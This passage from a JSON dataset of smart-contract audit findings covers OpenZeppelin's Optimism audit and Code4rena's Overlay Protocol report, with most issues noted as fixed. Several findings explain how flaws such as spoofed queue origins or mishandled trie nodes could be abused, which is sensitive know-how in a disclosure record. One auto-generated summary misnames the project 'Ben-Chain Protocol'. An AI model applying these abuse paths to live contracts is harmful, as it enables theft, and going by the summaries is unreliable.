      "summary": "\nThis bug report is about the `contributesToFraudProof` modifier declared in the `Abs_FraudContributor` contract, which is used to reward users for participating in proving fraud. The bug is that users are receiving rewards for irrelevant contributions such as contributing irrelevant contract state or storage slots before a fraud proof, or attempting to initialize a fraud proof that has already been initialized. The `OVM_BondManager` contract is out of the audit's scope, but the Optimism team has acknowledged the issue and decided not to prioritize this issue because it does not apply to the current release, since the bond manager is disabled.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10723",
      "title": "[H03] Relayers may not receive transaction fees",
      "impact": "HIGH",
      "content": "Transactions that go through the [`execute` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L46) of an instance of the `OVM_ECDSAContractAccount` contract are [expected to pay transaction fees to relayers](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L92-L101). The function assumes that whoever called it is a relayer, and simply [transfers the fee](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L97-L99), paid in ovmETH.\n\n\nHowever, there are two common cases in which the `execute` function can be called, and in neither of them the fee appears to be correctly paid to relayer accounts.\n\n\n* For sequenced transactions, their entrypoint is set to the address of the [`OVM_ProxySequencerEntrypoint`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol) predeployed contract. Ultimately, it is this proxy who [calls the `execute` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_SequencerEntrypoint.sol#L62-L70) of any `OVM_ECDSAContractAccount` contract. As a result, when the `execute` function [queries the `ovmCALLER`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L94), the address returned will be the address of the `OVM_ProxySequencerEntrypoint` contract, and fees will be sent to it. It is worth noting that neither this contract nor its associated implementation [`OVM_SequencerEntrypoint`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_SequencerEntrypoint.sol)have any kind of functionality to handle the received fees.\n* For queued transactions, their entrypoint is set by whoever [enqueues](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L256) the transaction in the Canonical Transaction Chain. If this entrypoint is set to an instance of the `OVM_ECDSAContractAccount` contract, when the transaction is run and the `execute` function is called, the [internal call to `ovmCALLER`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/accounts/OVM_ECDSAContractAccount.sol#L94), will simply return the default address for `ovmCALLER`, which is determined by the [`DEFAULT_ADDRESS` constant address](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L75) of the `OVM_ExecutionManager` contract. As a result, the fees will be sent to this address.\n\n\nConsider ensuring that when transaction fees are paid from instances of the `OVM_ECDSAContractAccount` contract, fees are correctly transferred to the expected relayer addresses.\n\n\n***Update:** Fixed in [pull request #1029](https://github.com/ethereum-optimism/optimism/pull/1029/commits/4a5bb28203dc6460b6e7ddaff3cd89e45a6b4d54). Fees are now transferred to a designated Sequencer Fee Wallet.*",
      "summary": "\nThis bug report is about the `OVM_ECDSAContractAccount` contract, which is part of the Ethereum Optimism project. The contract is supposed to pay transaction fees to relayers when the `execute` function is called. However, the bug report states that in two common cases, the fees are not correctly paid to the relayer accounts. \n\nThe first case is when the `execute` function is called by the `OVM_ProxySequencerEntrypoint` predeployed contract. In this case, the fees are sent to the address of the `OVM_ProxySequencerEntrypoint` contract, which does not have the functionality to handle the received fees. \n\nThe second case is when the `execute` function is called by whoever enqueues the transaction in the Canonical Transaction Chain. In this case, the `ovmCALLER` will return the default address for `ovmCALLER`, which is determined by the `DEFAULT_ADDRESS` constant address of the `OVM_ExecutionManager` contract. As a result, the fees will be sent to this address.\n\nThe bug report suggests ensuring that when transaction fees are paid from instances of the `OVM_ECDSAContractAccount` contract, fees are correctly transferred to the expected relayer addresses. The bug has been fixed in pull request #1029. Fees are now transferred to a designated Sequencer Fee Wallet.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10722",
      "title": "[H02] Unhandled transfer failures",
      "impact": "HIGH",
      "content": "The token bridge contracts synchronize deposits and withdrawals across the two domains. In particular, whenever tokens are [locked on layer 1](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L1TokenGateway.sol#L158-L162), the gateway [initiates a cross-domain message](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L1TokenGateway.sol#L172-L176) to mint equivalent tokens on layer 2. Similarly, when tokens are [burned on layer 2](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L187), the token [initiates a cross-domain message](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L197-L201) to release the funds on layer 1. However, the layer 1 ERC20 gateway does not check the return value of the [deposit](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/OVM_L1ERC20Gateway.sol#L76-L80) or [withdrawal](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/OVM_L1ERC20Gateway.sol#L98) transfers. This breaks the synchronization for ERC20 contracts that do not revert on failure, since failed deposits on layer 1 will be incorrectly credited on layer 2 and burned tokens on layer 2 may not be released on layer 1.\n\n\nConsider checking the return value on all token transfers and revert on failure.\n\n\n***Update**: Fixed in [pull request #988](https://github.com/ethereum-optimism/optimism/pull/988/commits/ce8071bc5ead86b75d5995111597bcdc4dc34385).*",
      "summary": "\nThis bug report is about token bridge contracts that are used to synchronize deposits and withdrawals across two domains. Whenever tokens are locked on layer 1, the gateway initiates a cross-domain message to mint equivalent tokens on layer 2. Similarly, when tokens are burned on layer 2, the token initiates a cross-domain message to release funds on layer 1. The problem is that the layer 1 ERC20 gateway does not check the return value of the deposit or withdrawal transfers, which breaks the synchronization for ERC20 contracts that do not revert on failure. The solution is to check the return value on all token transfers and revert on failure. This bug has already been fixed in a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10721",
      "title": "[H01] Valid transactions cannot be enqueued",
      "impact": "HIGH",
      "content": "Transactions to be appended to the Canonical Transaction Chain (CTC) can come from two sources: the L1 queue and the Sequencer. When transactions are enqueued in the `OVM_CanonicalTransactionChain` contract via its public [`enqueue` function](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L256), they are [explicitly limited](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L264-L267) in size to [`MAX_ROLLUP_TX_SIZE`](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L41) (10000 bytes). However, transactions coming from the Sequencer do not follow the same restriction – they can actually be larger than `MAX_ROLLUP_TX_SIZE`. As a result, it might be impossible to enqueue transactions in L1 that could be effectively included via the Sequencer.\n\n\nTo avoid censorship by the Sequencer, it should be possible for any valid sequenced transaction to instead be enqueued in L1. Therefore, consider enforcing an upper bound of `MAX_ROLLUP_TX_SIZE` in the size of transactions that go through the Sequencer.\n\n\n***Update**: Fixed in [pull request #361](https://github.com/ethereum-optimism/contracts/pull/361/commits/8da1c24bb08b8a10b56747add78c414e58ebadf4) of the archived `ethereum-optimism` repository.*",
      "summary": "\nA bug was reported in the Ethereum Optimism repository, where transactions coming from the Sequencer were not limited in size to the `MAX_ROLLUP_TX_SIZE` (10000 bytes). This meant that it was possible for transactions to be larger than this size, making it impossible to enqueue them in L1. To avoid censorship by the Sequencer, it was proposed to enforce an upper bound of `MAX_ROLLUP_TX_SIZE` in the size of transactions that go through the Sequencer. The bug was fixed in pull request #361 of the archived `ethereum-optimism` repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10720",
      "title": "[C04] Valid L1-to-L2 queue transactions may be proven fraudulent spoofing queue origin",
      "impact": "HIGH",
      "content": "When initializing a fraud proof via the `initializeFraudVerification` function of the `OVM_FraudVerifier` contract, the relevant [transaction is provided](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L96) so it can be [verified to exist](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_FraudVerifier.sol#L124) within the Canonical Transaction Chain. However, when verifying a transaction that was added through the L1-to-L2 queue (that is, via the [`enqueue` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L256) of the `OVM_CanonicalTransactionChain` contract), the [`l1QueueOrigin` field](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/codec/Lib_OVMCodec.sol#L63) of the transaction [is not validated](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/chain/OVM_CanonicalTransactionChain.sol#L1189-L1194).\n\n\nAs a result, anyone can provide a transaction maliciously setting its `l1QueueOrigin` field to `SEQUENCER_QUEUE` (instead of `L1TOL2_QUEUE`) when disputing a transaction that originated in the L1-to-L2 queue. The gas used by this transaction will be [attributed to the wrong queue](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L216)and any logic that relies on the [`ovmL1QUEUEORIGIN` opcode](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L330) may evaluate incorrectly. Naturally, this will produce a different final state, thus allowing the fraud proof to succeed even if the original transition was valid.\n\n\nConsider validating the `l1QueueOrigin` field of the provided transaction when initializing a fraud proof.\n\n\n***Update**: Fixed in [pull request #1155](https://github.com/ethereum-optimism/optimism/pull/1155/commits/aafb141bf798c657e8e0193e718068bed9211ebf).*",
      "summary": "\nThis bug report is related to the `OVM_FraudVerifier` contract and its `initializeFraudVerification` function. This function is used to verify transactions that were added through the L1-to-L2 queue. The problem is that the `l1QueueOrigin` field of the transaction is not being validated, which means that anyone can provide a malicious transaction with a `l1QueueOrigin` field set to `SEQUENCER_QUEUE` instead of `L1TOL2_QUEUE`. This would cause the gas used by the transaction to be attributed to the wrong queue and any logic that relies on the `ovmL1QUEUEORIGIN` opcode may evaluate incorrectly. This would produce a different final state, thus allowing the fraud proof to succeed even if the original transition was valid. The solution is to validate the `l1QueueOrigin` field of the provided transaction when initializing a fraud proof. This issue has been fixed in pull request #1155.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10719",
      "title": "[C03] Unbounded nuisance gas",
      "impact": "HIGH",
      "content": "When a transaction is executed, its nuisance gas budget [is limited](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1836) to the transaction gas limit. Additionally, the nuisance gas is [limited in every call frame](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L963) to the gas provided for that call. However, it is not limited by the [available nuisance gas before the call](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L962).\n\n\nAs a result, if the remaining nuisance gas budget is below the remaining transaction gas before an external call, the nuisance gas budget for the call frame will be incorrectly increased, and the call will be able to consume more nuisance gas than it should be allowed. In this scenario, the overall nuisance budget calculation performed after the call [will negative overflow](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1047). In practice, this means there is no limit to the amount of nuisance gas that can be used in a transaction, as long as each call frame restricts its nuisance gas usage to its own regular gas limit.\n\n\nConsider ensuring the nuisance gas budget of each call frame cannot exceed the overall budget.\n\n\n***Update**: Fixed in [pull request #1366](https://github.com/ethereum-optimism/optimism/pull/1366/commits/a2346c291797813f99b32e1d92f26c33a6d55d2d).*",
      "summary": "\nThis bug report is regarding the Ben-Chain Protocol, which is used to execute transactions. The bug report states that when a transaction is executed, the nuisance gas budget is limited to the transaction gas limit. Additionally, the nuisance gas is limited in every call frame to the gas provided for that call. However, it is not limited by the available nuisance gas before the call. This means that the call frame can consume more nuisance gas than it should be allowed, and the overall nuisance budget calculation performed after the call will negative overflow.\n\nTo fix this issue, the bug report suggests to ensure that the nuisance gas budget of each call frame cannot exceed the overall budget. This bug has been fixed in pull request #1366.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10718",
      "title": "[C02] Partially shared keys with EXTENSION nodes mishandled",
      "impact": "HIGH",
      "content": "Inside the [`_walkNodePath`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L232) function of the `Lib_MerkleTrie` library, when an `EXTENSION` node is encountered [which shares some, but not all of its key](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L322) with `keyRemainder`, the walk will move on to the node [which the `EXTENSION` node points to](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L325), but will only [increment the key index](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L326) by the `sharedNibbleLength`.\n\n\nMore specifically, when the `sharedNibbleLength` is not 0, it will be assumed that all nibbles are shared with the `EXTENSION` node. The walk will then move to the node which [the node links to](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L325), while the key increment will be set to [`sharedNibbleLength`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L326). This will result in an incorrect [`currentKeyIndex` on the next loop iteration](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L256). The `_walkNodePath` function will assume it has reached the node which the `EXTENSION` node points to, while the `currentKeyIndex` will correspond to a path in the middle of the `EXTENSION` node.\n\n\nThis means that the Merkle Trie may incorrectly identify some elements and there may be multiple keys that map to the same element. During fraud proof execution the described flaw could cause the `OVM_StateTransitioner` contract to incorrectly update [storage](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L430-L439) or [account](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L391-L400) elements, which could lead to a security vulnerability where invalid fraud proofs would succeed due to incorrect updates in trie roots.\n\n\nSince the `_walkNodePath` function should identify the nearest sibling to the [key](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/trie/Lib_MerkleTrie.sol#L234) which is being “walked” to, consider modifying the `_walkNodePath` function so that it breaks out of the loop and returns when a non-fully matching `EXTENSION` key is found.\n\n\n***Update**: Fixed in [pull request #747](https://github.com/ethereum-optimism/optimism/commit/ae1ac05d7032422a71caf25d16f6e548df5b8d7f).*",
      "summary": "\nThis bug report is about a flaw in the `_walkNodePath` function of the `Lib_MerkleTrie` library. This function is used to identify the nearest sibling to a key being “walked” to. The bug occurs when an `EXTENSION` node is encountered, which shares some, but not all of its key with `keyRemainder`. The walk will move on to the node which the `EXTENSION` node points to, but will only increment the key index by the `sharedNibbleLength`. This means that the Merkle Trie may incorrectly identify some elements and there may be multiple keys that map to the same element. During fraud proof execution, this could cause the `OVM_StateTransitioner` contract to incorrectly update storage or account elements, which could lead to a security vulnerability.\n\nTo fix this bug, the `_walkNodePath` function should break out of the loop and return when a non-fully matching `EXTENSION` key is found. This bug has been fixed in pull request #747.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10717",
      "title": "[C01] Possible state manipulation after execution of transactions with invalid gas limit",
      "impact": "HIGH",
      "content": "The [`run` function](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L155) of the `OVM_ExecutionManager` contract is [executed during a fraud proof](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L355) to move the associated State Transitioner from [pre-execution](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L328) to [post-execution](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L357) phase. Transactions with an invalid gas limit can still be run in a fraud proof, but they are expected to ultimately [result in a no-op](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L188). In other words, the pre- and post-state of a transaction with an invalid gas limit should be the same.\n\n\nRight before finishing execution of a regular transaction (that is, one that does not revert nor return early), the `run` function [resets to zero](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L211)the reference to the State Manager stored in the `ovmStateManager` state variable. However, this reference is not reset after finishing execution early [when the transaction’s gas limit is not valid](https://github.com/ethereum-optimism/contracts/blob/18e128343731b9bde23812ce932e24d81440b6b7/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L186-L189). As a result, the Execution Manager will still be able to execute calls to the associated State Manager, and in turn the State Manager will consider the caller Execution Manager as correctly authenticated.\n\n\nThe described behavior allows for anyone to call sensitive functions of the Execution Manager contract right after the execution of `run`, which could result in arbitrary state modifications in the State Manager contract. As a consequence, it would not be possible to successfully finish the fraud proof in the State Transitioner contract. For example, a malicious actor could call the [`ovmCREATEEOA` function](https://github.com/ethereum-optimism/contracts/blob/ec1afca9e15117608121377b15d66cb56084e52d/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L418) of the `OVM_ExecutionManager` contract, creating [a new account in state](https://github.com/ethereum-optimism/contracts/blob/ec1afca9e15117608121377b15d66cb56084e52d/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L460), which would in turn [increment](https://github.com/ethereum-optimism/contracts/blob/ec1afca9e15117608121377b15d66cb56084e52d/contracts/optimistic-ethereum/OVM/execution/OVM_ExecutionManager.sol#L1216) the total number of uncommitted accounts in the State Manager. This would effectively prevent [completing the transition](https://github.com/ethereum-optimism/contracts/blob/ec1afca9e15117608121377b15d66cb56084e52d/contracts/optimistic-ethereum/OVM/verification/OVM_StateTransitioner.sol#L415-L418) in the `OVM_StateTransitioner` contract.\n\n\nConsider clearing the `ovmStateManager` state variable after execution of transactions with invalid gas limits.\n\n\n***Update**: Fixed in [pull request #366](https://github.com/ethereum-optimism/contracts/pull/366) of the archived `ethereum-optimism` repository.*",
      "summary": "\nThis bug report is about the `run` function of the `OVM_ExecutionManager` contract, which is executed during a fraud proof to move the associated State Transitioner from pre-execution to post-execution phase. It has been observed that transactions with an invalid gas limit can still be run in a fraud proof, which should ultimately result in a no-op. However, the `ovmStateManager` state variable is not reset after finishing execution early when the transaction’s gas limit is not valid. This allows for anyone to call sensitive functions of the Execution Manager contract right after the execution of `run`, which could result in arbitrary state modifications in the State Manager contract. As a consequence, it would not be possible to successfully finish the fraud proof in the State Transitioner contract.\n\nTo address this issue, it has been suggested to clear the `ovmStateManager` state variable after execution of transactions with invalid gas limits. This issue has been fixed in pull request #366 of the archived `ethereum-optimism` repository.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42323",
      "title": "[M-04] _totalSupply not updated in _transferMint() and _transferBurn()",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon, also found by WatchPug, harleythedog, hubble, xYrYuYx, cmichel, and defsec_\n\n#### Impact\n\nThe functions `\\_transferMint()` and `\\_transferBurn()` of OverlayToken.sol don't update `\\_totalSupply`.\nWhereas the similar functions `\\_mint()` and `\\_burn()` do update `\\_totalSupply`.\n\nThis means that `\\_totalSupply` and `totalSupply()` will not show a realistic view of the total OVL tokens.\n\nFor the protocol itself it isn't such a problem because this value isn't used in the protocol (as far as I can see).\nBut other protocols building on Overlay may use it, as well as user interfaces and analytic platforms.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L349-L364>\n\n```js\nfunction _mint( address account, uint256 amount) internal virtual {\n   ...\n      _totalSupply += amount;\n```\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L376-L395\n\n```js\nfunction _burn(address account, uint256 amount) internal virtual {\n   ...\n        _totalSupply -= amount;\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L194-L212\n\nhttps://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L268-L286\n```\n\n## Recommended Mitigation Steps\nUpdate `_totalSupply`  in `_transferMint()` and `_transferBurn()`\n\n\n**[realisation (Overlay) commented](https://github.com/code-423n4/2021-11-overlay-findings/issues/59#issuecomment-988286320):**\n > We're not sure if this is a 1 or a 2. Definitely, at least a one - this is an incorrect implementation of the spec. \n> \n> But is it a two? It wouldn't lose funds with our contracts, we make no use of the total supply of OVL in our accounting.\n> \n> This might prove to be a vulnerability if another protocol, like Ribbon, used us for a vault of theirs, made use of total supply, and failed to discern this problem.\n> \n> \n> \n> \n\n\n\n",
      "summary": "\nThis bug report is about a problem with the functions `_transferMint()` and `_transferBurn()` in the OverlayToken.sol contract. These functions do not update the `_totalSupply` value, unlike the similar functions `_mint()` and `_burn()`. This means that the total supply of OVL tokens will not be accurately reflected. While this may not affect the protocol itself, it could cause issues for other protocols and user interfaces that rely on this value. The recommended mitigation step is to update `_totalSupply` in the affected functions. It is not clear if this bug is a major issue, but it could potentially cause problems for other protocols that use OverlayToken.sol. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "42322",
      "title": "[M-03] Can't enableCollateral after a disableCollateral",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\n#### Impact\n\nThe function `disableCollateral` of OverlayV1Mothership.sol doesn't set `collateralActive\\[\\_collateral] = false;`\nBut it does revoke the roles.\n\nNow `enableCollateral`  can never be used because `collateralActive\\[\\_collateral] ==true`  and it will never pass the second require.\nSo you can never grant the roles again.\n\nNote: `enableCollateral` also doesn't set `collateralActive\\[\\_collateral] = true`\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/mothership/OverlayV1Mothership.sol#L133-L153>\n\n```JS\nfunction enableCollateral (address _collateral) external onlyGovernor {\n    require(collateralExists[_collateral], \"OVLV1:!exists\");\n    require(!collateralActive[_collateral], \"OVLV1:!disabled\");\n    OverlayToken(ovl).grantRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n    OverlayToken(ovl).grantRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n}\n\nfunction disableCollateral (address _collateral) external onlyGovernor {\n    require(collateralActive[_collateral], \"OVLV1:!enabled\");\n    OverlayToken(ovl).revokeRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);\n    OverlayToken(ovl).revokeRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);\n}\n```\n\n#### Recommended Mitigation Steps\n\nIn function `enableCollateral()` add the following (after the require):\n`collateralActive\\[\\_collateral] = true;`\n\nIn function `disableCollateral` add the following (after the require):\n`collateralActive\\[\\_collateral] = false;`\n\n**[mikeyrf (Overlay) confirmed](https://github.com/code-423n4/2021-11-overlay-findings/issues/55)** \n\n",
      "summary": "\nThe function `disableCollateral` in the code for OverlayV1Mothership.sol is not working properly. It does not set `collateralActive[_collateral]` to false, but it does revoke certain roles. This means that the function `enableCollateral` cannot be used because `collateralActive[_collateral]` will always be true and the second requirement will never be met. This also means that the roles cannot be granted again. To fix this, the code needs to be updated in both the `enableCollateral` and `disableCollateral` functions to properly set `collateralActive[_collateral]` to true and false, respectively. This issue has been confirmed by another user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Overlay Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-overlay",
      "github_link": "https://github.com/code-423n4/2021-11-overlay-findings/issues/55",
      "tags": [],
      "finders": []
    },
    {
      "id": "42321",
      "title": "[H-01] `OverlayV1UniswapV3Market` computes wrong market liquidity",
      "impact": "HIGH",
